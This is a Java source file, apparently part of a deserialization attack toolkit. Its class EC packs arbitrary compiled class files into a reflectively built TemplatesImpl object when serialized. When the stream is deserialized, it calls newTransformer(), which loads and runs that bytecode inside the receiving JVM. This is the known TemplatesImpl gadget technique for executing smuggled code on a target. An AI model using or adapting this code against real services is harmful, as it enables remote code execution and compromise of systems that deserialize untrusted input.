package x;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl;

/**
 * Encrypted Classes holder, duplicated here with functions to write during serialize.
 */
public class EC implements Serializable {

	public static Object t;
	
	private static final long serialVersionUID = 7184753337713309073L;

	transient List<File> files = new ArrayList<File>();

	private String baseDirectory;
	
	public EC() {
	}
	
	public void setBaseDirectory(String string) {
		this.baseDirectory = string;
	}
	
	public void add(Class<?> clazz) {
		add(new File(baseDirectory+"/"+clazz.getName().replace('.', '/')+".class"));
	}
	
	public void add(File classFile) {
		files.add(classFile);
	}
	
	public void add(String classFile) {
		files.add(new File(classFile));
	}
	
	private void writeObject(java.io.ObjectOutputStream out) throws IOException {
		byte[][] classBytes = new byte[files.size()][];
		for( int i=0; i<files.size(); i++ ) {
			File f = files.get(i);
			byte[] b = new byte[(int) f.length()];
			FileInputStream fin = new FileInputStream(f);
			fin.read(b);
			fin.close();
			classBytes[i]=b;
		}
		Constructor<TemplatesImpl> c;
		try {
			c = TemplatesImpl.class.getDeclaredConstructor(new Class[] {byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class});
			c.setAccessible(true);
			TemplatesImpl impl = c.newInstance(classBytes,"x",new Properties(),0,new TransformerFactoryImpl());			
			out.writeObject(impl);
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}
	
	public Class<?> getClass(String name) throws ClassNotFoundException {
		Method m;
		try {
			m = t.getClass().getMethod("getClass", new Class[] { String.class });
			return (Class<?>) m.invoke(t, name);
		} catch (Exception e) {
			throw new RuntimeException("Blubb",e);
		}
	}
		     
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
    	TemplatesImpl templatesImpl = (TemplatesImpl) in.readObject();
//    	Object templatesImpl = in.readObject();
    	try {
    		// This instantiates the ClassFindingTranslet
			TransformerImpl impl = (TransformerImpl) templatesImpl.newTransformer();
//			Object impl = templatesImpl.getClass().getDeclaredMethod("newTransformer").invoke(templatesImpl);
			t = impl.getClass().getMethod("getParameter",String.class).invoke(impl, "x");
		} catch (Exception e) {
			throw new RuntimeException("Blah",e);
		} 
    }
	
}
